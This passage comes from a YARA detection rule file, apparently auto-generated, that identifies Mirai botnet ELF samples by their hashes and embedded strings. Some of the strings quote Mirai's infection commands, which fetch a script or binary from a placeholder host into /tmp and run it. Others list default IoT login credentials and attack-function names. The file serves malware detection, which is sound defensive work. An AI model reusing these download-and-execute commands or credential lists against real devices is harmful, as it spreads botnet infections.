      description = "_subset_batch - from files Mirai(signature)_9f09a1fa.elf, Mirai(signature)_a6b63acf.elf, Mirai(signature)_aa22ecce.elf, Mirai(signature)_ace77db8.elf, Mirai(signature)_aed2684c.elf, Mirai(signature)_b231dca7.elf, Mirai(signature)_b3ec2d41.elf, Mirai(signature)_b5432303.elf, Mirai(signature)_b6eba472.elf, Mirai(signature)_b9e6d81e.elf, Mirai(signature)_bab55c44.elf, Mirai(signature)_bc18d26b.elf, Mirai(signature)_bc664992.elf, Mirai(signature)_bfdb9dee.elf, Mirai(signature)_c2f4418b.elf, Mirai(signature)_c304393b.elf, Mirai(signature)_c42981eb.elf, Mirai(signature)_c550a3ff.elf, Mirai(signature)_c6287737.elf, Mirai(signature)_c6b87887.elf, Mirai(signature)_c8b6771f.elf, Mirai(signature)_cb5f5c2e.elf, Mirai(signature)_cbd6296b.elf, Mirai(signature)_cc9e3877.elf, Mirai(signature)_cdb09620.elf, Mirai(signature)_cf5a8021.elf, Mirai(signature)_d099bbc6.elf, Mirai(signature)_d31e8855.elf, Mirai(signature)_d392be4c.elf, Mirai(signature)_d490d161.elf, Mirai(signature)_d7ce9f38.elf, Mirai(signature)_da498da6.elf, Mirai(signature)_db218111.elf, Mirai(signature)_dbfd8e66.elf, Mirai(signature)_dd9e67fc.elf, Mirai(signature)_ded92df2.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9f09a1fac7a028af8255a299ce103dfa0c4b94fc4458f0587bf14736baa65134"
      hash2 = "a6b63acfbcc69f6baecc415e8098e26ece3abefb2410350fc782091dbd17f0d3"
      hash3 = "aa22ecceb63bad035279e71f1eba07ec49ca783da7e92eb250bd4cd400f18f39"
      hash4 = "ace77db8aa98e2d72be06bdf7198156227ef9361b0eb503621119776b251805e"
      hash5 = "aed2684ce2281e414afb53f7a22f73cda2f302bdd6642ed3fede62f58bd64cb0"
      hash6 = "b231dca721cce75dbc61fd4cba5f74f1ceadeeb53e77361a948bd41adb4beae9"
      hash7 = "b3ec2d41d61858de19ac879d9a470d2d7ccea4d69656451bfa9dcae1ab55ffdc"
      hash8 = "b54323035aa1ff2acc01fc8b5620504b6c15f1aaa7ffe2daf813449ddd420ee2"
      hash9 = "b6eba472d354a2d86f28fe6f0380d2f8b63cfa3600389351fb2607c4de56f426"
      hash10 = "b9e6d81e69b3465ea7eabba8a23dd228c7da4817ca6f7287134342db0035938f"
      hash11 = "bab55c448aba00e0e64b337e93e2e69fc255c7bb6fd0589ab5f9ad6df780493b"
      hash12 = "bc18d26b8250b4ab63424b39b97e3efa97967c5538c19fe497e78aa6d859512c"
      hash13 = "bc664992a2cb27fe49620206516834a8d570f71e17a08ce80fb3eaa6c52acb65"
      hash14 = "bfdb9deeddac8493ea50b24b869164b389bb979d56b3e4a43d829ceff1b85938"
      hash15 = "c2f4418ba2d9f31dbbb1f0a69a9f9adc6a66256d2d11d0087bd64067fdebdf83"
      hash16 = "c304393ba97f7d02803f6ce97f496a2f724d48a2b51c8002bf7e668c875f19f9"
      hash17 = "c42981ebde9605e716fd06e860677bc2592781cea4dbeeca889a500dae0a4e00"
      hash18 = "c550a3ffa2809ee8447654b111c83836d964752ace30fd3978fc431d2df24cd6"
      hash19 = "c6287737f5a1d1fe46a5e74b20ca39d747f3ea07e0390104f62932c0534bf363"
      hash20 = "c6b878876d6546ec516cc270b621c3be6a34472d504389a5ae1d56fa1fc1dfbd"
      hash21 = "c8b6771fd48f277a40bed562ad8e3d6eefeb4c8736bde596a658342e4cafe51c"
      hash22 = "cb5f5c2e2180ceb3738a62d920c0cf09a6d6cce9541f86f3d798d25798217c3a"
      hash23 = "cbd6296b5bf06484226496e256fe6e47b7906cdaaed57298b426e9d9e6f4e61b"
      hash24 = "cc9e38778b68071bce9b1308bff956bb65e109cfbe1bd5c27c904f8e1429d1d9"
      hash25 = "cdb0962013439d621a034a7b0e1a981fde907feff8bde1297743d4853084b98e"
      hash26 = "cf5a802122e42bb3a9390bcec6aaf1c0d0b1a84215706d06ae6d3a427c329d42"
      hash27 = "d099bbc6025d2caf98129bd7828e24be44af5703de2ff7983bf05baeab94b257"
      hash28 = "d31e8855bd0463e79991a7f445de36062fb457d4f1fd2f04a0e47d9873a23f7c"
      hash29 = "d392be4c88e746a9b0952c4d250d330e5354b35dc7857fe72d04e95228d9c420"
      hash30 = "d490d161287ee404fb5ea94b46f7e46e20597fefa77764b576226042bdc4c18e"
      hash31 = "d7ce9f389a812ea2360ec313a324f8c0e321da34eca891912806c2d665b46333"
      hash32 = "da498da61bc9fe62c5b6e192d921f3faa76f0b154331e177de584db2a1d9593f"
      hash33 = "db2181117644d92b9d38c775456fde7143075c579a033e02bf1dd1c934d1db3a"
      hash34 = "dbfd8e66d167084be37c35ba51f4add30903ef04fdb28798a5b11fad465c28c0"
      hash35 = "dd9e67fc4090b7af2ae256e4190546246f4c5c417a31ce05191e0813f141a68e"
      hash36 = "ded92df2f33efea20f9ecfc7ae7f0cd3552403ca1bd226acce208b116ab361ec"
   strings:
      $s1 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0" fullword ascii /* score: '14.00'*/
      $s2 = "Mozilla/5.0 (Linux; Android 14; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s4 = "Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s5 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0" fullword ascii /* score: '14.00'*/
      $s6 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (X11; Ubuntu; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Linux; Android 14; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0." ascii /* score: '14.00'*/
      $s13 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s14 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s15 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__9ee70765_Mirai_signature__a09cc99f_Mirai_signature__a4fca913_Mirai_signature__a61cf7bc_Mirai_signature__a6_9 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_9ee70765.elf, Mirai(signature)_a09cc99f.elf, Mirai(signature)_a4fca913.elf, Mirai(signature)_a61cf7bc.elf, Mirai(signature)_a625b094.elf, Mirai(signature)_a99601f4.elf, Mirai(signature)_af398d23.elf, Mirai(signature)_b21b51c6.elf, Mirai(signature)_b288ce5a.elf, Mirai(signature)_b3583e97.elf, Mirai(signature)_b3f0efad.elf, Mirai(signature)_b4d20e02.elf, Mirai(signature)_b65f040a.elf, Mirai(signature)_b7d3820f.elf, Mirai(signature)_be6a67d8.elf, Mirai(signature)_bf5f8542.elf, Mirai(signature)_c5fabc2a.elf, Mirai(signature)_c749bbd8.elf, Mirai(signature)_cc2e3f3a.elf, Mirai(signature)_d29dccab.elf, Mirai(signature)_d4b30e4f.elf, Mirai(signature)_d8e38b21.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "9ee707654c2dffebf8186fe189d4cbcee5fccb0fc78e720b0e225c8f290d804e"
      hash2 = "a09cc99ffa0adb4941ac7542f50e44d302075934c1cbc393e095568298b950e3"
      hash3 = "a4fca9134c48bd530f339b70d5ae620de9c301544ed299bb0baeeebafacd995b"
      hash4 = "a61cf7bcf9faf4e599c133ff6424929ab21707fcd73d9e47a04269998110bf96"
      hash5 = "a625b094739874aae8f8ddbf96a43fb3c49ba1f6f98ee9cf268527381b0e78c8"
      hash6 = "a99601f47504decf8c1fb96c233bd51994eb4b35a9b1bc08af998570b3130e01"
      hash7 = "af398d23f5233dafe8f852385f7ae2aeace1c57718351946d872f6a9b0bfaa64"
      hash8 = "b21b51c6f5f99188d65c277375bd5d2e943b22a332a0cd1cbda46d9a2929c67e"
      hash9 = "b288ce5aae1c3c0e9fc125773894f458467d228a03e7b2de6db308de8fbfe7de"
      hash10 = "b3583e97be3716c970d6ab6bce81240fce43463933f0c8f1cef92cbb0055dbb6"
      hash11 = "b3f0efadb786b232cbca56a9bf5de3af8dd7beadb24e35aff846afe611279af8"
      hash12 = "b4d20e02802148e43640880ebf6bf4a703bfa06d4fbbca5da01c127b1c0a3354"
      hash13 = "b65f040a3b87b12ad0b1565d38f0e3a0efd2ed859ea6f5a2db1ab61c6e88cf26"
      hash14 = "b7d3820f76049bd88d2d7f81867d1eb0629aeb123a0b4d95c047256199457d5a"
      hash15 = "be6a67d89ff29125f0ed4b10775591c95af9335d0b723baca3ff14075a17c8ad"
      hash16 = "bf5f85422a3cbd5546d94d752e52393c4056a1b0cad5214a66e9e467e5e3af55"
      hash17 = "c5fabc2a9780bf7464219eb346851d7eae3fdbe827d1e946be610cd96e32c6dd"
      hash18 = "c749bbd84d9ba5dd9f843e2ef48444c5b4fd4e34e0d24212c08bfc43a3cec17f"
      hash19 = "cc2e3f3a23f116ee83264c093570d8585d0a1eb8f943378e22ef7e8e4abf636b"
      hash20 = "d29dccab4b0c5597d8d70efc60a3e14e6868a2175b6366a0f8ccfe0a790d65ce"
      hash21 = "d4b30e4f367331a4b3713ab0416042c28786df4a03b0e44c45d732b8ace37265"
      hash22 = "d8e38b2119ddb78df4dbc14a75b966fc07cf869a6faa342077253f255a1a7bb2"
   strings:
      $s1 = "nlwlqlob" fullword ascii /* score: '8.00'*/
      $s2 = "bgnjmjpwqbwlq" fullword ascii /* score: '8.00'*/
      $s3 = "eojqvpfq" fullword ascii /* score: '8.00'*/
      $s4 = "brvbqjl" fullword ascii /* score: '8.00'*/
      $s5 = "pvsslqw" fullword ascii /* score: '8.00'*/
      $s6 = "bgpoqllw" fullword ascii /* score: '8.00'*/
      $s7 = "sqfnjfq" fullword ascii /* score: '8.00'*/
      $s8 = "pvsfqujplq" fullword ascii /* score: '8.00'*/
      $s9 = "gfebvow" fullword ascii /* score: '8.00'*/
      $s10 = "wfomfwbgnjm" fullword ascii /* score: '8.00'*/
      $s11 = "gltmolbg" fullword ascii /* score: '8.00'*/
      $s12 = "lsfqbwlq" fullword ascii /* score: '8.00'*/
      $s13 = "sbpptlqg" fullword ascii /* score: '8.00'*/
      $s14 = "pvsfqbgnjm" fullword ascii /* score: '8.00'*/
      $s15 = "bgnjmwfomfw" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__be321b13_Mirai_signature__c2949738_Mirai_signature__cd7bdf53_10 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_be321b13.elf, Mirai(signature)_c2949738.elf, Mirai(signature)_cd7bdf53.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "be321b13c09e5264aa09f9d02ff9ca14e73bf4b901a0f52799cc3adcb301a4aa"
      hash2 = "c2949738acd6083404e98a847a5c97b0e4a01df8412cd6dd09c7a5a88b8ea0e5"
      hash3 = "cd7bdf53fb2b4d794b07ed5574739dfcc65b9360b4d0bdaf48c7dad4ec700347"
   strings:
      $s1 = "/proc/%ld/cmdline" fullword ascii /* score: '12.00'*/
      $s2 = "apt install tor -y > /dev/null" fullword ascii /* score: '12.00'*/
      $s3 = "liid*0+5%-Hdflkqjvm>%Lkq`i%Hdf%JV%]%45Z44Z3,%Duui`R`gNlq*354+2+2%-NMQHI)%iln`%B`fnj,%S`wvljk*<+4+7%Vdcdwl*354+2+2" fullword ascii /* score: '11.00'*/
      $s4 = "service tor start" fullword ascii /* score: '9.00'*/
      $s5 = "liid*0+5%-Rlkajrv%KQ%45+5>%Rlk31>%}31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*37+5+6757+<1" fullword ascii /* score: '8.00'*/
      $s6 = "liid*0+5%-Hdflkqjvm>%Lkq`i%Hdf%JV%]%45+=>%ws?74+5,%B`fnj*75455454%Clw`cj}*74+5" fullword ascii /* score: '8.00'*/
      $s7 = "liid*0+5%-Rlkajrv%KQ%45+5>%RJR31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*07+5+7216+443%Vdcdwl*062+63" fullword ascii /* score: '8.00'*/
      $s8 = "liid*0+5%-Rlkajrv%KQ%3+4>%RJR31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*07+5+7216+443%Vdcdwl*062+63" fullword ascii /* score: '8.00'*/
      $s9 = "@KLBHD?%duui`q%kjq%cjpka" fullword ascii /* score: '8.00'*/
      $s10 = "liid*0+5%-Hdflkqjvm>%Lkq`i%Hdf%JV%]%45+=>%ws?71+5,%B`fnj*75455454%Clw`cj}*71+5" fullword ascii /* score: '8.00'*/
      $s11 = "liid*1+5%-fjhudqlgi`>%HVL@%<+5>%Rlkajrv%KQ%3+4>%Qwla`kq*1+5>%BQG2+1>%LkcjUdqm+7>%VS4>%+K@Q%FIW%1+1+0=2<<>%RJR31>%`k(PV," fullword ascii /* score: '8.00'*/
      $s12 = "dvvrjwa" fullword ascii /* score: '8.00'*/
      $s13 = "liid*1+5%-fjhudqlgi`>%HVL@%<+5>%Rlkajrv%KQ%0+4>%Qwla`kq*0+5," fullword ascii /* score: '8.00'*/
      $s14 = "liid*0+5%-Rlkajrv%KQ%45+5>%RJR31,%Duui`R`gNlq*062+63%-NMQHI)%iln`%B`fnj,%Fmwjh`*04+5+7251+456%Vdcdwl*062+63" fullword ascii /* score: '8.00'*/
      $s15 = "liid*1+5%-fjhudqlgi`>%HVL@%<+5>%Rlkajrv%KQ%3+4>%Qwla`kq*0+5>%CpkR`gUwjapfqv," fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a33d308d_Mirai_signature__a9306462_Mirai_signature__ae15573c_Mirai_signature__c44d12b5_Mirai_signature__c7_11 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a33d308d.elf, Mirai(signature)_a9306462.elf, Mirai(signature)_ae15573c.elf, Mirai(signature)_c44d12b5.elf, Mirai(signature)_c762d569.elf, Mirai(signature)_d359fb9e.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a33d308d7560a24eb559bfb76508936cc4a60f83277d96165da478f63916fb9d"
      hash2 = "a9306462ce53b33cd05af426f22770523c27984404cc201a939e53580fb8f545"
      hash3 = "ae15573cb7ec407161a8cbf8cdab4536e1d24339f71943bcfdf35a82194416e7"
      hash4 = "c44d12b59d5376a431af062fd04154f5127c11142fd298e563f238193f2592be"
      hash5 = "c762d5690505e8b826c8367dae57153d0f62bf363b50085d5523f8537c3e3735"
      hash6 = "d359fb9e2c9e203968526cc5ece0c69f5146066d1d96aae511f6b46b43732e4c"
   strings:
      $s1 = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" fullword ascii /* score: '22.00'*/
      $s2 = "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" fullword ascii /* score: '22.00'*/
      $s3 = "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)" fullword ascii /* score: '22.00'*/
      $s4 = "hexdump" fullword ascii /* score: '18.00'*/
      $s5 = "DuckDuckBot/1.0; (+http://duckduckgo.com/duckduckbot.html)" fullword ascii /* score: '17.00'*/
      $s6 = "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s7 = "Mozilla/5.0 (Linux; Android 11; Mi 10T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s8 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s9 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s10 = "Mozilla/5.0 (Linux; Android 13; SM-G991U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36" fullword ascii /* score: '14.00'*/
      $s11 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_3_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36" fullword ascii /* score: '14.00'*/
      $s12 = "postgresql" fullword ascii /* score: '13.00'*/
      $s13 = "syslogd" fullword ascii /* score: '13.00'*/
      $s14 = "rsyslog" fullword ascii /* score: '13.00'*/
      $s15 = "Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safar" ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 300KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__aa22ecce_Mirai_signature__b3ec2d41_Mirai_signature__b6eba472_Mirai_signature__bab55c44_Mirai_signature__bf_12 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_aa22ecce.elf, Mirai(signature)_b3ec2d41.elf, Mirai(signature)_b6eba472.elf, Mirai(signature)_bab55c44.elf, Mirai(signature)_bfdb9dee.elf, Mirai(signature)_c42981eb.elf, Mirai(signature)_c550a3ff.elf, Mirai(signature)_c6b87887.elf, Mirai(signature)_d392be4c.elf, Mirai(signature)_d7ce9f38.elf, Mirai(signature)_dbfd8e66.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "aa22ecceb63bad035279e71f1eba07ec49ca783da7e92eb250bd4cd400f18f39"
      hash2 = "b3ec2d41d61858de19ac879d9a470d2d7ccea4d69656451bfa9dcae1ab55ffdc"
      hash3 = "b6eba472d354a2d86f28fe6f0380d2f8b63cfa3600389351fb2607c4de56f426"
      hash4 = "bab55c448aba00e0e64b337e93e2e69fc255c7bb6fd0589ab5f9ad6df780493b"
      hash5 = "bfdb9deeddac8493ea50b24b869164b389bb979d56b3e4a43d829ceff1b85938"
      hash6 = "c42981ebde9605e716fd06e860677bc2592781cea4dbeeca889a500dae0a4e00"
      hash7 = "c550a3ffa2809ee8447654b111c83836d964752ace30fd3978fc431d2df24cd6"
      hash8 = "c6b878876d6546ec516cc270b621c3be6a34472d504389a5ae1d56fa1fc1dfbd"
      hash9 = "d392be4c88e746a9b0952c4d250d330e5354b35dc7857fe72d04e95228d9c420"
      hash10 = "d7ce9f389a812ea2360ec313a324f8c0e321da34eca891912806c2d665b46333"
      hash11 = "dbfd8e66d167084be37c35ba51f4add30903ef04fdb28798a5b11fad465c28c0"
   strings:
      $s1 = "Origin: https://www.yahoo.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.reddit.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.amazon.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.facebook.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.linkedin.com" fullword ascii /* score: '21.00'*/
      $s6 = "Origin: https://www.netflix.com" fullword ascii /* score: '21.00'*/
      $s7 = "Origin: https://www.twitter.com" fullword ascii /* score: '21.00'*/
      $s8 = "Origin: https://www.bing.com" fullword ascii /* score: '21.00'*/
      $s9 = "Origin: https://www.youtube.com" fullword ascii /* score: '21.00'*/
      $s10 = "Origin: https://www.google.com" fullword ascii /* score: '21.00'*/
      $s11 = "Referer: https://www.youtube.com/" fullword ascii /* score: '17.00'*/
      $s12 = "Referer: https://www.reddit.com/" fullword ascii /* score: '17.00'*/
      $s13 = "Referer: https://www.amazon.com/" fullword ascii /* score: '17.00'*/
      $s14 = "Referer: https://www.bing.com/" fullword ascii /* score: '17.00'*/
      $s15 = "Referer: https://www.netflix.com/" fullword ascii /* score: '17.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a7c7a4e2_Mirai_signature__ab665ac6_Mirai_signature__b67f7fe1_Mirai_signature__b8e18358_Mirai_signature__c8_13 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a7c7a4e2.elf, Mirai(signature)_ab665ac6.elf, Mirai(signature)_b67f7fe1.elf, Mirai(signature)_b8e18358.elf, Mirai(signature)_c8393ef6.elf, Mirai(signature)_c9328f78.elf, Mirai(signature)_dc9e2f2a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a7c7a4e2f42040cd94d2dc2104a93c86b2c5a83b7f113861a1184eda2752073f"
      hash2 = "ab665ac655e26157c3af8939bc2f0a677ea93174566931b95d8ec7864e0569c8"
      hash3 = "b67f7fe1169e6c6139b92f3d3daee8ba1bb19b3c1c3267f29cbbd1a4f7d09b93"
      hash4 = "b8e1835879b4aeb84fcaf19d9775adb28848bc031e0634df5f092cc27136fa5e"
      hash5 = "c8393ef6fa63cb5e8df05f72037b6505bf7f5591fee32881a84c5fa639fc3da5"
      hash6 = "c9328f788c095471ba7ba4a9bf702bcda6e5e7d20119da8db261279bd1333211"
      hash7 = "dc9e2f2a8df6bd4d9b86cbaa6042df1f2f0ef8670f510545cda2c827aa2d4e67"
   strings:
      $s1 = "cd /tmp || cd /var || cd /dev/shm;wget http://%s/telnet.sh; curl -O http://%s/telnet.sh; chmod 777 telnet.sh; sh telnet.sh; " fullword ascii /* score: '25.00'*/
      $s2 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s3 = "orf; cd /tmp; /bin/busybox wget http://%s/mipsel; chmod 777 mipsel; ./mipsel selfrep.realtek; /bin/busybox wget http://%s/mips; " ascii /* score: '25.00'*/
      $s4 = "[0mPassword: " fullword ascii /* score: '16.00'*/
      $s5 = "POST / HTTP/1.1" fullword ascii /* score: '12.00'*/
      $s6 = "Login:" fullword ascii /* score: '12.00'*/
      $s7 = "!shellcmd " fullword ascii /* score: '12.00'*/
      $s8 = "[0mNo shell available" fullword ascii /* score: '12.00'*/
      $s9 = "/command/" fullword ascii /* score: '12.00'*/
      $s10 = "[0mWrong password!" fullword ascii /* score: '12.00'*/
      $s11 = "login:" fullword ascii /* score: '12.00'*/
      $s12 = "/proc/%s/comm" fullword ascii /* score: '10.00'*/
      $s13 = "[0mAccess granted!" fullword ascii /* score: '9.00'*/
      $s14 = "/fhrom/fhshell/" fullword ascii /* score: '9.00'*/
      $s15 = "!openshell" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__ab1a7156_Mirai_signature__b65f040a_14 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_ab1a7156.elf, Mirai(signature)_b65f040a.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ab1a7156179e8ba66177bfe455a2a00e0bdec190e2dda53fe046518853d93a06"
      hash2 = "b65f040a3b87b12ad0b1565d38f0e3a0efd2ed859ea6f5a2db1ab61c6e88cf26"
   strings:
      $s1 = "commands_process" fullword ascii /* score: '23.00'*/
      $s2 = "flood_udp_bypass" fullword ascii /* score: '20.00'*/
      $s3 = "fill_attack_target" fullword ascii /* score: '14.00'*/
      $s4 = "exploitscanner_setup_connection" fullword ascii /* score: '12.00'*/
      $s5 = "commands.c" fullword ascii /* score: '12.00'*/
      $s6 = "commands_parse" fullword ascii /* score: '12.00'*/
      $s7 = "exploitscanner_recv_strip_null" fullword ascii /* score: '9.00'*/
      $s8 = "exploitscanner_scanner_rawpkt" fullword ascii /* score: '9.00'*/
      $s9 = "util_encryption" fullword ascii /* score: '9.00'*/
      $s10 = "exploitscanner_rsck" fullword ascii /* score: '9.00'*/
      $s11 = "exploitscanner_fake_time" fullword ascii /* score: '9.00'*/
      $s12 = "cncsocket" fullword ascii /* score: '8.00'*/
      $s13 = "cncsock" fullword ascii /* score: '8.00'*/
      $s14 = "scan_tmp_dirs_and_kill" fullword ascii /* score: '8.00'*/
      $s15 = "exploit_init" fullword ascii /* score: '8.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__a8806e48_Mirai_signature__b220175a_Mirai_signature__b49e3eb1_Mirai_signature__b8a1a94f_Mirai_signature__b8_15 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_a8806e48.elf, Mirai(signature)_b220175a.elf, Mirai(signature)_b49e3eb1.elf, Mirai(signature)_b8a1a94f.elf, Mirai(signature)_b8a85184.elf, Mirai(signature)_baf48d48.elf, Mirai(signature)_bf16b942.elf, Mirai(signature)_bfc73660.elf, Mirai(signature)_c2d0fe71.elf, Mirai(signature)_c5a2bb36.elf, Mirai(signature)_c7262411.elf, Mirai(signature)_c83428ec.elf, Mirai(signature)_cac1190d.elf, Mirai(signature)_cbdaa444.elf, Mirai(signature)_cc8bef06.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a8806e48002c4fc06ad4ce13ae364524f6da816a310faed83e57556303f1f162"
      hash2 = "b220175a3601f0ecf631a1322ee2d9b67069f6c34937048a1ce982bb0b088c20"
      hash3 = "b49e3eb19b6149a631b568930414d51484151f9f10f13edff24fde9e3160ef80"
      hash4 = "b8a1a94f76991f0f5c8a1679196b54c1db8f0c919644551ac3abf3604cfb7ab0"
      hash5 = "b8a85184c6f6065953a720fafa698af3e21d4cc0ae338bcdd38cb07defcdc25e"
      hash6 = "baf48d481e35adc4eb0ed13ec032b72a635365d11e595a09302c669e72684a6b"
      hash7 = "bf16b942a2775519ba0001f34dac9307572ffd363906f751fb73655cc64a345d"
      hash8 = "bfc73660150a364da12aa5bd69c4823f49b92ae68c0d13bc30558b91c18b87f6"
      hash9 = "c2d0fe71a5197e56e58ca2dc8b4b6441adc50b1ad5906cc0aafc0e1ba8118cd4"
      hash10 = "c5a2bb36a3e9ac22e9269bf1da9b36d5f3ecec9ec8171f79fe5c7458fac5f867"
      hash11 = "c7262411abf8efb467bf07b75a78cb0b98a68a0c6480c2acdfe2e9dd7f37fcf4"
      hash12 = "c83428ec5e156733c527a074467fef85b161cbef2f65f94b3e72e8c8b3f5e49a"
      hash13 = "cac1190da7130f97fb7abbf9c5266ade24d2045abb4d4626cfbd801938ac88b6"
      hash14 = "cbdaa444bc8c2f8c5bdad87cdfd4cea20d87aee0214fdf0ea8ab697670e9177c"
      hash15 = "cc8bef06c2dbae794aa558c199028602c34c09f1991c5d2fa0ca3ce4b9525f84"
   strings:
      $s1 = "tluafed" fullword ascii /* reversed goodware string 'default' */ /* score: '18.00'*/
      $s2 = "xirtam" fullword ascii /* reversed goodware string 'matrix' */ /* score: '15.00'*/
      $s3 = "telecomadmin" fullword ascii /* score: '11.00'*/
      $s4 = "admintelecom" fullword ascii /* score: '11.00'*/
      $s5 = "solokey" fullword ascii /* score: '11.00'*/
      $s6 = "supportadmin" fullword ascii /* score: '11.00'*/
      $s7 = "telnetadmin" fullword ascii /* score: '8.00'*/
      $s8 = "zhongxing" fullword ascii /* score: '8.00'*/
      $s9 = "root123" fullword ascii /* score: '8.00'*/
      $s10 = "grouter" fullword ascii /* score: '8.00'*/
      $s11 = "unisheen" fullword ascii /* score: '8.00'*/
      $s12 = "root621" fullword ascii /* score: '8.00'*/
